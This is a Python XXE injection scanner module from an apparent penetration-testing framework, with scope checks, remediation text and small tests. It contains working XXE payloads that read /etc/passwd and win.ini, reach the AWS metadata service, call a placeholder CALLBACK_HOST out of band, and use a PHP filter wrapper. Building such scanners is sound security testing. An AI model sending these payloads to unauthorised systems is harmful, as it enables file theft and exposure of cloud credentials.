"""XXE (XML External Entity) injection scanner."""
from __future__ import annotations

import asyncio
import re
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence, save_http_evidence
from common.finding import Severity

CVSS_XXE = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L"
CVSS40_XXE = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:L/SC:N/SI:N/SA:N"
XXE_PAYLOADS = [
    # Linux file read
    (
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "Linux /etc/passwd",
    ),
    # Windows file read
    (
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
        "Windows win.ini",
    ),
    # SSRF via HTTP
    (
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        "SSRF to AWS metadata",
    ),
    # Blind XXE — OOB via parameter entity
    (
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://CALLBACK_HOST/xxe">%xxe;]><root>test</root>',
        "Blind OOB XXE",
    ),
    # PHP filter wrapper
    (
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
        "PHP filter wrapper",
    ),
]

# Indicators of XXE success
PASSWD_INDICATORS = ["root:x:", "root:0:0:", "daemon:x:", "nobody:x:"]
WIN_INDICATORS    = ["; for 16-bit app support", "[fonts]", "[extensions]"]
CLOUD_INDICATORS  = ["ami-id", "instance-id", "local-ipv4", "hostname"]


class XxeScanner(BaseModule):
    """XXE injection scanner."""

    NAME        = "xxe_scanner"
    DESCRIPTION = "Test XML endpoints for XXE (file read, SSRF, OOB) injection"
    PHASE       = 4
    TAGS        = ["injection", "xxe", "xml", "cwe-611", "owasp-a03"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target.rstrip("/")
        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        # Find XML-accepting endpoints
        endpoints = await self._find_xml_endpoints(target)
        self.log.info("Testing %d XML endpoint(s) for XXE", len(endpoints))

        sem = asyncio.Semaphore(2)
        tasks = [self._test_xxe(ep, target, sem) for ep in endpoints]
        await asyncio.gather(*tasks, return_exceptions=True)

        return self._make_result(start)

    async def _find_xml_endpoints(self, target: str) -> list[dict]:
        """Find endpoints that accept XML (from crawler or probe common paths)."""
        endpoints: list[dict] = []

        # Use crawled forms that might accept XML
        for form in self.config.extra.get("found_forms", []):
            if form.get("method") == "POST":
                endpoints.append({"url": form["action"], "method": "POST",
                                   "content_type": "application/xml"})

        # Probe known XML endpoints
        xml_paths = [
            "/api/v1/upload", "/api/upload", "/xml", "/api/xml",
            "/soap", "/service", "/ws", "/webservice",
            "/rss", "/feed", "/atom",
            "/api/parse", "/api/process",
        ]
        import aiohttp
        for path in xml_paths:
            url = f"{target}{path}"
            await self.rate_limit()
            try:
                async with aiohttp.ClientSession(
                    connector=aiohttp.TCPConnector(ssl=False)
                ) as session:
                    async with session.post(
                        url,
                        data="<test/>",
                        headers={"Content-Type": "application/xml"},
                        timeout=aiohttp.ClientTimeout(total=5),
                    ) as resp:
                        if resp.status in (200, 400, 422, 500):
                            body = await resp.text(errors="ignore")
                            if any(kw in body.lower() for kw in
                                   ["xml", "parse", "entity", "invalid"]):
                                endpoints.append({
                                    "url": url, "method": "POST",
                                    "content_type": "application/xml"
                                })
            except Exception:
                pass

        return endpoints[:10]

    async def _test_xxe(self, endpoint: dict, target: str, sem: asyncio.Semaphore) -> None:
        async with sem:
            url  = endpoint["url"]
            if not self.check_scope(url):
                return

            for payload, description in XXE_PAYLOADS[:3]:  # Skip OOB by default
                await self.rate_limit()
                try:
                    import aiohttp
                    async with aiohttp.ClientSession(
                        connector=aiohttp.TCPConnector(ssl=False)
                    ) as session:
                        async with session.post(
                            url,
                            data=payload,
                            headers={
                                "Content-Type": endpoint.get("content_type", "application/xml"),
                                "Accept": "application/xml, text/xml, */*",
                            },
                            timeout=aiohttp.ClientTimeout(total=10),
                        ) as resp:
                            body = await resp.text(errors="ignore")

                    # Check for successful file read
                    if any(ind in body for ind in PASSWD_INDICATORS):
                        ev = Evidence(
                            request_raw=f"POST {url}\nContent-Type: application/xml\n\n{payload}",
                            response_raw=body[:2000],
                            extra={"url": url, "payload": description},
                        )
                        ev.screenshot_path = await self.capture_screenshot(
                            url, finding_id=f"xxe_{url.replace('https://','').replace('/','_')}"
                        )
                        self.new_finding(
                            title=f"XXE — /etc/passwd Read via {description} ({url})",
                            severity=Severity.CRITICAL,
                            description=(
                                f"XXE injection confirmed at {url}. "
                                f"Server responded with /etc/passwd contents. "
                                "An attacker can read arbitrary local files and potentially "
                                "perform SSRF to reach internal services."
                            ),
                            reproduction_steps=[
                                f"curl -s -X POST {url} "
                                f"-H 'Content-Type: application/xml' "
                                f"-d '{payload[:100]}...'",
                            ],
                            remediation=(
                                "Disable external entity processing in your XML parser. "
                                "Java: factory.setFeature('http://xml.org/sax/features/external-general-entities', false)\n"
                                "Python: defusedxml library\n"
                                "PHP: libxml_disable_entity_loader(true)"
                            ),
                            references=["CVE-2021-40690", "CWE-611", "OWASP A03:2021",
                                       "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_XXE,
                            cvss_v40_vector=CVSS40_XXE,
                            mitre_attack=["TA0007/T1083"],
                            target=target,
                            url=url,
                        )
                        return  # One finding per endpoint is enough

                    elif any(ind in body for ind in WIN_INDICATORS):
                        ev = Evidence(
                            request_raw=f"POST {url}\n\n{payload[:200]}",
                            response_raw=body[:1000],
                            extra={"url": url, "payload": description},
                        )
                        self.new_finding(
                            title=f"XXE — Windows File Read via {description} ({url})",
                            severity=Severity.CRITICAL,
                            description=(
                                f"XXE injection confirmed at {url} — Windows win.ini contents returned."
                            ),
                            reproduction_steps=[f"Payload: {payload[:100]}"],
                            remediation="Disable external entity processing in XML parser.",
                            references=["CWE-611", "OWASP A03:2021"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_XXE,
                            cvss_v40_vector=CVSS40_XXE,
                            target=target,
                            url=url,
                        )
                        return

                    elif any(ind in body for ind in CLOUD_INDICATORS):
                        ev = Evidence(
                            request_raw=f"POST {url}\n\n{payload[:200]}",
                            response_raw=body[:500],
                            extra={"url": url, "payload": "SSRF to cloud metadata"},
                        )
                        self.new_finding(
                            title=f"XXE — SSRF to Cloud Metadata ({url})",
                            severity=Severity.CRITICAL,
                            description=(
                                f"XXE injection at {url} allowed SSRF to the cloud instance metadata API. "
                                "IAM credentials and internal config may be exposed."
                            ),
                            reproduction_steps=[f"Payload: SSRF to 169.254.169.254"],
                            remediation="Disable external entities; block access to IMDS from application.",
                            references=["CWE-611", "CWE-918"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_XXE,
                            cvss_v40_vector=CVSS40_XXE,
                            target=target,
                            url=url,
                        )
                        return

                except Exception as exc:
                    self.log.debug("XXE test failed on %s: %s", url, exc)


class TestXxeScanner:
    def test_payloads_defined(self) -> None:
        assert len(XXE_PAYLOADS) >= 3
        for payload, desc in XXE_PAYLOADS:
            assert "<?xml" in payload or "<!DOCTYPE" in payload
            assert desc

    def test_passwd_indicators(self) -> None:
        body = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:"
        assert any(ind in body for ind in PASSWD_INDICATORS)
